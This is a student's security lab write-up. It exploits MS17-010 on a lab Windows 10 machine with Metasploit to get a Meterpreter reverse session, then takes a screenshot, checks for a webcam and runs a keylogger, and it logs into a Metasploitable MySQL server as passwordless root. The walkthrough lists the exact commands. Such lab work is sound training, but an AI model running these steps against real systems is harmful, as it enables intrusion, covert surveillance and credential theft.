# SOC Lab 07 – MS17-010 Post-Exploitation & MySQL Misconfiguration

**Date:** 2026-04-14  
**Author:** Luca Danisi  
**Status:** Completed ✅

---

## Objective

The goal of this lab was to compromise two target machines by exploiting known vulnerabilities and misconfigurations.

**Target 1 — Windows (192.168.50.102):** Obtain a Meterpreter remote session by exploiting MS17-010, then perform post-exploitation actions: capture a desktop screenshot, check for webcam presence, and intercept keystrokes.

**Target 2 — Metasploitable (192.168.50.101):** Access the MySQL database by exploiting a misconfiguration — root account with no password — and retrieve the list of database users.

---

## Lab Environment

| Machine | Role | IP Address | OS |
|---|---|---|---|
| Kali Linux | Attacker | 192.168.50.100 | Kali Linux |
| Windows | Target 1 | 192.168.50.102 | Windows 10 Pro |
| Metasploitable | Target 2 | 192.168.50.101 | Metasploitable 2 |

All three machines were connected through an internal VirtualBox network.

---

## Tools Used

**Nmap** — Network scanner used to verify connectivity between machines and confirm the presence of vulnerabilities. Specifically, the smb-vuln-ms17-010 script was used to detect the MS17-010 vulnerability on the Windows target, and a port scan was run on port 3306 to confirm the MySQL service was active on Metasploitable.

**Metasploit Framework** — Exploitation framework used to run the ms17_010_psexec module against the Windows machine. This module exploits the MS17-010 vulnerability and delivers a Meterpreter session with SYSTEM-level privileges.

**Meterpreter** — Advanced post-exploitation shell provided by Metasploit. Used after compromising the Windows machine to capture a desktop screenshot, check for webcam presence, and intercept keystrokes via keylogger.

**MySQL Client** — Command-line client used to connect directly to the MySQL database running on Metasploitable and query the list of users present in the system.

---

## Results

### Target 1 — Windows (192.168.50.102)

The initial Nmap scan confirmed that port 445 (SMB) was open and that the machine was vulnerable to MS17-010. Using the ms17_010_psexec module in Metasploit, a Meterpreter session was obtained with full SYSTEM-level privileges.

Once inside the system, the following post-exploitation actions were performed:

- **Desktop Screenshot** — captured successfully. The screenshot showed the live desktop of the victim machine, confirming complete visual access to the system.
- **Webcam Check** — no webcam was detected on the machine. Output: No webcams were found.
- **Keylogger** — started and working correctly. The keylogger successfully intercepted keystrokes typed by the user, including the text "Ricerca esercizio" followed by the Enter key, demonstrating the ability to capture any input — including passwords.

### Target 2 — Metasploitable (192.168.50.101)

The MySQL service was accessible from the network on port 3306 with the root account and no password required. A direct connection was established without any authentication. The following database users were retrieved:

| User | Host |
|------|------|
| debian-sys-maint | localhost |
| guest | % (any IP) |
| root | % (any IP) |

---

## Issues Encountered

**Problem 1 — EternalBlue module failed on Windows 10**

The first module attempted was ms17_010_eternalblue. The exploit completed but no session was created — the error returned was "Exploit completed, but no session was created." Even though Nmap had confirmed the vulnerability, the pure EternalBlue module did not work reliably against Windows 10. The issue was resolved by switching to the alternative module ms17_010_psexec, which exploits the same MS17-010 vulnerability but uses a different delivery method, successfully opening the Meterpreter session.

**Problem 2 — Screenshot not available from the initial session**

After obtaining the Meterpreter session, the screenshot command returned the following error: "Current session was spawned by a service on Windows 8+. No desktops are available to screenshot." The session had started as a system service, without access to the graphical desktop. The issue was resolved by migrating the process to explorer.exe — the process responsible for managing the Windows desktop — using the command migrate -N explorer.exe.

**Problem 3 — MySQL connection failed due to SSL incompatibility**

The Kali Linux MySQL client attempted to establish an SSL connection with the Metasploitable MySQL server by default. Since Metasploitable runs an outdated system, this caused the error: "TLS/SSL error: wrong version number." The issue was resolved by adding the --skip-ssl parameter to the connection command, disabling SSL negotiation and allowing a plain connection.

---

## Conclusions

### Target 1 — Windows (192.168.50.102)

The Windows machine was vulnerable to MS17-010, a critical flaw in the SMB service that allows remote code execution without any authentication. Once access was obtained, the level of control achieved was total: visual access to the desktop, ability to intercept everything typed on the keyboard, and potential access to any webcam connected to the system. A real attacker could have caused enormous damage — from credential theft to complete takeover of the machine.

### Target 2 — Metasploitable (192.168.50.101)

The Metasploitable machine had a basic but critical misconfiguration: the MySQL database was accessible from the network with the root account and no password. This type of error allows anyone on the network to access all data stored in the database with no authentication required.

Both vulnerabilities identified in this lab are entirely preventable with basic security practices:

- Keep systems updated with the latest security patches
- Properly configure all services exposed on the network
- Never use weak or absent credentials on critical services such as databases

This lab reinforced an important lesson: a single unpatched vulnerability or a simple misconfiguration is enough to give an attacker complete control over a system. Prevention and proper configuration are always the first line of defense.

---

## Technical Walkthrough

### Target 1 — Windows (192.168.50.102)

**Step 1 — Connectivity Check**

A ping test was performed between Kali Linux and the Windows machine to confirm that both machines were reachable on the internal network before starting any activity.

**Step 2 — Vulnerability Detection**

Nmap was used to confirm the presence of the MS17-010 vulnerability on port 445:

```bash
nmap --script smb-vuln-ms17-010 -p 445 192.168.50.102
```
Scans port 445 using a specific script to check if the machine is vulnerable to MS17-010.

Output confirmed: port 445 open, status VULNERABLE, CVE-2017-0143, Risk Factor HIGH, OS detected as Windows 10 Pro 10240 x64.

**Step 3 — Loading the Exploit Module**

Metasploit Framework was launched and the exploitation module was loaded:

```bash
use exploit/windows/smb/ms17_010_psexec
```
Loads the module that exploits MS17-010 using psexec as the delivery method.

The following parameters were configured:

```bash
set RHOSTS 192.168.50.102
```
Sets the IP address of the target machine.

```bash
set LHOST 192.168.50.100
```
Sets the IP address of our Kali machine, where the reverse connection will be received.

Payload used automatically: windows/x64/meterpreter/reverse_tcp

**Step 4 — Exploit Execution**

The exploit was launched with the run command. The relevant output confirmed: SYSTEM session obtained and Meterpreter session 1 opened — full system privileges achieved.

**Step 5 — Process Migration**

The initial session had no access to the graphical desktop. The process was migrated to explorer.exe to gain desktop access:

```bash
migrate -N explorer.exe
```
Moves the Meterpreter session into the explorer.exe process, which manages the Windows desktop, allowing screenshots to be captured.

**Step 6 — Desktop Screenshot**

A screenshot of the victim machine desktop was captured:

```bash
screenshot
```
Captures a live image of the target machine's desktop.

Output: Screenshot saved to /home/kali/ZtsEuccJ.jpeg — the Windows 10 desktop of the target machine was clearly visible.

**Step 7 — Webcam Check**

The presence of a webcam on the victim machine was checked:

```bash
webcam_list
```
Lists all webcams available on the target machine.

Output: No webcams were found.

**Step 8 — Keylogger**

The keylogger was started to intercept keystrokes on the victim machine:

```bash
keyscan_start
```
Starts the keylogger, which records everything typed on the victim's keyboard.

```bash
keyscan_dump
```
Downloads and displays all keystrokes captured up to that point.

Output successfully intercepted: "Ricerca esercizio" followed by the Enter key.

---

### Target 2 — Metasploitable (192.168.50.101)

**Step 1 — Connectivity Check**

A ping test confirmed that Kali Linux and Metasploitable were correctly connected on the internal network.

**Step 2 — MySQL Port Verification**

Nmap was used to confirm that the MySQL service was active on port 3306:

```bash
nmap -p 3306 192.168.50.101
```
Checks that the MySQL service is active and reachable on the standard port 3306.

**Step 3 — MySQL Connection**

A direct connection to the MySQL database was attempted as root with no password, disabling SSL negotiation:

```bash
mysql -h 192.168.50.101 -u root --skip-ssl
```
Connects to the MySQL database as root with no password. The --skip-ssl parameter disables SSL negotiation, required because Metasploitable runs a version too old for the modern Kali client.

Connection successful — no authentication required.

**Step 4 — User List Retrieval**

Once connected to the database, the full list of users was retrieved:

```bash
SELECT user, host FROM mysql.user;
```
Queries the MySQL user table and returns the username and allowed host for each account.

Output returned 3 users: debian-sys-maint, guest, and root — all visible without any authentication.

---

## Screenshots

- Figure 1 – Connectivity check between machines
- Figure 2 – Port 445 scan – MS17-010 vulnerability confirmed
- Figure 3 – Metasploit – MS17-010 module search
- Figure 4 – EternalBlue MS17-010 exploit execution and Meterpreter session
- Figure 5 – Webcam check
- Figure 6 – Keylogger dump
- Figure 7 – Nmap scan on port 3306 and MySQL access

---

> ⚠️ **Disclaimer:** This lab was performed in a controlled environment for educational purposes only. All tools were used exclusively on machines owned and managed by the author.
